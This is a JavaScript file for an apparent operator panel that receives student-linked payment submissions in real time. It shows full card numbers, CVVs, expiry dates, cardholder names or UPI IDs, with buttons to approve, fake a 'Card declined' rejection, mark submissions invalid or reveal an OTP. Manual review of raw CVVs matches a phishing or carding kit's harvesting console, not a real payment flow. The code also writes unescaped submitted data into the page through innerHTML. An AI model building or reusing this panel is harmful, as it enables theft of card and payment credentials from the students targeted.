// Admin Panel - Real-Time Card Submission Management
// Socket.IO Client for Real-Time Communication

let socket = null;
const submissions = new Map(); // Store submissions by sessionId

// Initialize Socket.IO Connection
function initializeConnection() {
    socket = io('http://localhost:3000', {
        transports: ['websocket', 'polling'],
        reconnection: true,
        reconnectionDelay: 1000,
        reconnectionAttempts: 10
    });

    // Connection Events
    socket.on('connect', () => {
        console.log('✅ Connected to server');
        updateConnectionStatus(true);
    });

    socket.on('disconnect', () => {
        console.log('❌ Disconnected from server');
        updateConnectionStatus(false);
    });

    socket.on('connect_error', (error) => {
        console.error('Connection error:', error);
        updateConnectionStatus(false);
    });

    // Connection Update
    socket.on('connectionUpdate', (data) => {
        updateConnectionCount(data.activeConnections || 0);
    });

    // Real-Time Card Details Received
    socket.on('cardDetailsReceived', (data) => {
        console.log('💳 New card details received:', data);
        handleNewCardSubmission(data);
    });

    // UPI Details Received
    socket.on('upiDetailsReceived', (data) => {
        console.log('📱 New UPI details received:', data);
        handleNewUpiSubmission(data);
    });

    // Payment Status Updates
    socket.on('paymentCompleted', (data) => {
        console.log('✅ Payment completed:', data);
        updateSubmissionStatus(data.sessionId, 'completed');
    });

    socket.on('paymentFailed', (data) => {
        console.log('❌ Payment failed:', data);
        updateSubmissionStatus(data.sessionId, 'failed', data.reason);
    });
}

// Update Connection Status Indicator
function updateConnectionStatus(isConnected) {
    const statusDot = document.querySelector('.status-dot');
    const statusText = document.querySelector('.status-text');
    
    if (isConnected) {
        statusDot.style.background = '#00ff00';
        statusText.textContent = 'Live';
    } else {
        statusDot.style.background = '#ff0000';
        statusText.textContent = 'Disconnected';
    }
}

// Update Connection Count
function updateConnectionCount(count) {
    const connectionCount = document.getElementById('connectionCount');
    if (connectionCount) {
        connectionCount.textContent = `Connections: ${count}`;
    }
}

// Handle New Card Submission
function handleNewCardSubmission(data) {
    const submission = {
        id: data.sessionId,
        type: 'card',
        student: data.student,
        cardDetails: data.cardDetails,
        amount: data.amount,
        timestamp: data.timestamp || new Date().toISOString(),
        status: 'processing'
    };
    
    submissions.set(data.sessionId, submission);
    renderSubmission(submission, true);
    hideEmptyState();
}

// Handle New UPI Submission
function handleNewUpiSubmission(data) {
    const submission = {
        id: data.sessionId,
        type: 'upi',
        student: data.student,
        upiDetails: data.upiDetails,
        amount: data.amount,
        timestamp: data.timestamp || new Date().toISOString(),
        status: 'processing'
    };
    
    submissions.set(data.sessionId, submission);
    renderSubmission(submission, true);
    hideEmptyState();
}

// Render Submission Card
function renderSubmission(submission, isNew = false) {
    const grid = document.getElementById('submissionsGrid');
    
    // Check if card already exists
    const existingCard = document.getElementById(`card-${submission.id}`);
    if (existingCard) {
        existingCard.remove();
    }
    
    const card = document.createElement('div');
    card.className = `submission-card${isNew ? ' new' : ''}`;
    card.id = `card-${submission.id}`;
    
    if (isNew) {
        setTimeout(() => {
            card.classList.remove('new');
        }, 3000);
    }
    
    const formattedTime = formatTimestamp(submission.timestamp);
    
    let detailsHtml = '';
    
    if (submission.type === 'card') {
        detailsHtml = `
            <div class="card-details-grid">
                <div class="detail-item">
                    <div class="detail-label">Card Number</div>
                    <div class="detail-value">${submission.cardDetails.cardNumber}</div>
                </div>
                <div class="detail-item">
                    <div class="detail-label">Card Type</div>
                    <div class="detail-value">${submission.cardDetails.cardType || 'Unknown'}</div>
                </div>
                <div class="detail-item">
                    <div class="detail-label">Expiry Date</div>
                    <div class="detail-value">${submission.cardDetails.expiryDate}</div>
                </div>
                <div class="detail-item">
                    <div class="detail-label">CVV</div>
                    <div class="detail-value">${submission.cardDetails.cvv}</div>
                </div>
                <div class="detail-item">
                    <div class="detail-label">Card Holder</div>
                    <div class="detail-value">${submission.cardDetails.cardHolderName}</div>
                </div>
                <div class="detail-item amount-section">
                    <div class="detail-label">Amount</div>
                    <div class="amount-value">₹${submission.amount.toLocaleString('en-IN')}</div>
                </div>
            </div>
        `;
    } else if (submission.type === 'upi') {
        detailsHtml = `
            <div class="card-details-grid">
                <div class="detail-item">
                    <div class="detail-label">UPI ID</div>
                    <div class="detail-value">${submission.upiDetails.upiId}</div>
                </div>
                <div class="detail-item">
                    <div class="detail-label">UPI App</div>
                    <div class="detail-value">${submission.upiDetails.upiApp || 'Unknown'}</div>
                </div>
                <div class="detail-item amount-section">
                    <div class="detail-label">Amount</div>
                    <div class="amount-value">₹${submission.amount.toLocaleString('en-IN')}</div>
                </div>
            </div>
        `;
    }
    
    card.innerHTML = `
        ${isNew ? '<div class="new-badge">NEW</div>' : ''}
        <div class="status-badge status-${submission.status}">${submission.status.toUpperCase()}</div>
        
        <div class="submission-header">
            <div class="submission-id">SESSION: ${submission.id}</div>
            <div class="submission-time">${formattedTime}</div>
        </div>
        
        <div class="student-info">
            <div class="student-name">${submission.student.name}</div>
            <div class="student-details">
                Roll: ${submission.student.rollNumber} | 
                ${submission.student.course || 'N/A'} | 
                Semester: ${submission.student.semester || 'N/A'}
            </div>
        </div>
        
        ${detailsHtml}
        
        <div class="otp-display" id="otp-${submission.id}">
            <div class="otp-label">OTP Code</div>
            <div class="otp-value">123456</div>
        </div>
        
        <div class="commands-section">
            <button class="command-btn btn-success" onclick="executeCommand('${submission.id}', 'success')">
                ✅ Success
            </button>
            <button class="command-btn btn-fail" onclick="executeCommand('${submission.id}', 'fail')">
                ❌ Fail
            </button>
            <button class="command-btn btn-invalid" onclick="executeCommand('${submission.id}', 'invalid')">
                ⚠️ Invalid
            </button>
            <button class="command-btn btn-otp" onclick="toggleOTP('${submission.id}')">
                🔐 Show OTP
            </button>
        </div>
    `;
    
    // Insert at the beginning (newest first)
    grid.insertBefore(card, grid.firstChild);
}

// Execute Admin Command
function executeCommand(sessionId, action) {
    const submission = submissions.get(sessionId);
    if (!submission) {
        console.error('Submission not found:', sessionId);
        return;
    }
    
    console.log(`⚙️ Executing command: ${action} for session: ${sessionId}`);
    
    if (action === 'success') {
        // Approve payment
        socket.emit('adminCommand', {
            command: 'approvePayment',
            sessionId: sessionId,
            action: 'approve'
        });
        
        updateSubmissionStatus(sessionId, 'completed');
        showNotification(`✅ Payment approved for ${submission.student.name}`, 'success');
        
    } else if (action === 'fail') {
        // Reject payment
        const reason = prompt('Enter rejection reason:', 'Card declined') || 'Card declined';
        
        socket.emit('adminCommand', {
            command: 'rejectPayment',
            sessionId: sessionId,
            action: 'reject',
            reason: reason
        });
        
        updateSubmissionStatus(sessionId, 'failed', reason);
        showNotification(`❌ Payment rejected for ${submission.student.name}`, 'error');
        
    } else if (action === 'invalid') {
        // Mark as invalid
        socket.emit('adminCommand', {
            command: 'rejectPayment',
            sessionId: sessionId,
            action: 'invalid',
            reason: 'Invalid card details'
        });
        
        updateSubmissionStatus(sessionId, 'invalid');
        showNotification(`⚠️ Payment marked as invalid for ${submission.student.name}`, 'warning');
    }
}

// Toggle OTP Display
function toggleOTP(sessionId) {
    const otpDisplay = document.getElementById(`otp-${sessionId}`);
    if (otpDisplay) {
        if (otpDisplay.classList.contains('show')) {
            otpDisplay.classList.remove('show');
        } else {
            // Generate random OTP (in production, this would come from backend)
            const otp = Math.floor(100000 + Math.random() * 900000);
            otpDisplay.querySelector('.otp-value').textContent = otp;
            otpDisplay.classList.add('show');
            
            showNotification(`🔐 OTP displayed for session ${sessionId}`, 'info');
        }
    }
}

// Update Submission Status
function updateSubmissionStatus(sessionId, status, reason = null) {
    const submission = submissions.get(sessionId);
    if (submission) {
        submission.status = status;
        if (reason) {
            submission.failureReason = reason;
        }
        
        // Update the card in UI
        const card = document.getElementById(`card-${sessionId}`);
        if (card) {
            const statusBadge = card.querySelector('.status-badge');
            if (statusBadge) {
                statusBadge.className = `status-badge status-${status}`;
                statusBadge.textContent = status.toUpperCase();
            }
            
            // Disable commands after action
            const commandButtons = card.querySelectorAll('.command-btn');
            commandButtons.forEach(btn => {
                btn.disabled = true;
                btn.style.opacity = '0.5';
                btn.style.cursor = 'not-allowed';
            });
        }
    }
}

// Show Notification
function showNotification(message, type = 'info') {
    console.log(`[${type.toUpperCase()}] ${message}`);
    
    // Create notification element
    const notification = document.createElement('div');
    notification.style.cssText = `
        position: fixed;
        top: 100px;
        right: 40px;
        background: ${type === 'success' ? '#00cc00' : type === 'error' ? '#cc0000' : type === 'warning' ? '#cc6600' : '#0066cc'};
        color: #ffffff;
        padding: 15px 20px;
        border-radius: 8px;
        box-shadow: 0 4px 20px rgba(0, 0, 0, 0.5);
        z-index: 1000;
        font-size: 14px;
        font-weight: 500;
        animation: slideInRight 0.3s ease-out;
    `;
    notification.textContent = message;
    
    document.body.appendChild(notification);
    
    // Remove after 3 seconds
    setTimeout(() => {
        notification.style.animation = 'slideOutRight 0.3s ease-out';
        setTimeout(() => {
            notification.remove();
        }, 300);
    }, 3000);
}

// Hide Empty State
function hideEmptyState() {
    const emptyState = document.getElementById('emptyState');
    if (emptyState) {
        emptyState.style.display = 'none';
    }
}

// Format Timestamp
function formatTimestamp(timestamp) {
    const date = new Date(timestamp);
    const now = new Date();
    const diffMs = now - date;
    const diffMins = Math.floor(diffMs / 60000);
    
    if (diffMins < 1) {
        return 'Just now';
    } else if (diffMins < 60) {
        return `${diffMins} minute${diffMins > 1 ? 's' : ''} ago`;
    } else {
        const hours = date.getHours().toString().padStart(2, '0');
        const minutes = date.getMinutes().toString().padStart(2, '0');
        return `${hours}:${minutes}`;
    }
}

// Add CSS animations
const style = document.createElement('style');
style.textContent = `
    @keyframes slideInRight {
        from {
            transform: translateX(400px);
            opacity: 0;
        }
        to {
            transform: translateX(0);
            opacity: 1;
        }
    }
    
    @keyframes slideOutRight {
        from {
            transform: translateX(0);
            opacity: 1;
        }
        to {
            transform: translateX(400px);
            opacity: 0;
        }
    }
`;
document.head.appendChild(style);

// Initialize on page load
window.addEventListener('DOMContentLoaded', () => {
    console.log('🚀 Admin Panel initialized');
    initializeConnection();
});
